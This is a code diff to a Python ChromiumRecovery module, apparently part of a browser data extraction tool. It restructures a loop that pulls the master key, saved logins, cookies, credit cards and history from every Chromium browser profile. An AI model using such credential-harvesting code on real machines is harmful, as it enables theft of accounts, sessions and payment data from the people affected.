@@ -359,58 +359,64 @@ class ChromiumRecovery(ModuleManager):
         available_browsers = self.installed_chromium_browsers()
 
         for browser in available_browsers:
-            browser_path = self.browsers[browser]
-            master_key = self.__get_master_key(
-                browser_path=browser_path, browser_name=browser)
+            try:
+                browser_path = self.browsers[browser]
+                master_key = self.__get_master_key(
+                    browser_path=browser_path, browser_name=browser)
 
-            for profile in profiles:
-                self.save_results(
-                    browser, 'login',
-                    self.__get_login_data(
+                for profile in profiles:
+                    self.save_results(
+                        browser, 'login',
+                        self.__get_login_data(
+                            path=browser_path,
+                            profile=profile,
+                            master_key=master_key,
+                            browser_name=browser
+                        ), profile
+                    )
+
+                    self.save_results(
+                        browser, 'cookies',
+                        self.__get_cookies(
+                            path=browser_path,
+                            profile=profile,
+                            master_key=master_key,
+                            browser_name=browser
+                        ), profile
+                    )
+
+                    self.save_results(
+                        browser, 'cards',
+                        self.__get_credit_cards(
+                            path=browser_path,
+                            profile=profile,
+                            master_key=master_key,
+                            browser_name=browser
+                        ), profile
+                    )
+
+                    self.__get_web_history(
                         path=browser_path,
-                        profile=profile,
-                        master_key=master_key,
-                        browser_name=browser
-                    ), profile
-                )
+                        browser_name=browser,
+                        profile=profile
+                    )
 
-                self.save_results(
-                    browser, 'cookies',
-                    self.__get_cookies(
-                        path=browser_path,
-                        profile=profile,
-                        master_key=master_key,
-                        browser_name=browser
-                    ), profile
-                )
+                    # ????????????? NOTE ?????????????
+                    # If you wish to process history and then save this old way
+                    # Which is very slow, uncomment this code
 
-                self.save_results(
-                    browser, 'cards',
-                    self.__get_credit_cards(
-                        path=browser_path,
-                        profile=profile,
-                        master_key=master_key,
-                        browser_name=browser
-                    ), profile
-                )
+                    # -----------
+                    # self.save_results(
+                    #     browser, 'history',
+                    #     self.get_web_history(
+                    #         path=browser_path,
+                    #         browser_name=browser,
+                    #         profile=profile
+                    #     ), profile
+                    # )
+                    # -----------
 
-                self.__get_web_history(
-                    path=browser_path,
-                    browser_name=browser,
-                    profile=profile
-                )
+            except Exception as e:
+                self.merror(f"Error with extracting browser details of: {browser} at {self.browsers[browser]}")
 
-                # ????????????? NOTE ?????????????
-                # If you wish to process history and then save this old way
-                # Which is very slow, uncomment this code
-
-                # -----------
-                # self.save_results(
-                #     browser, 'history',
-                #     self.get_web_history(
-                #         path=browser_path,
-                #         browser_name=browser,
-                #         profile=profile
-                #     ), profile
-                # )
-                # -----------
+                
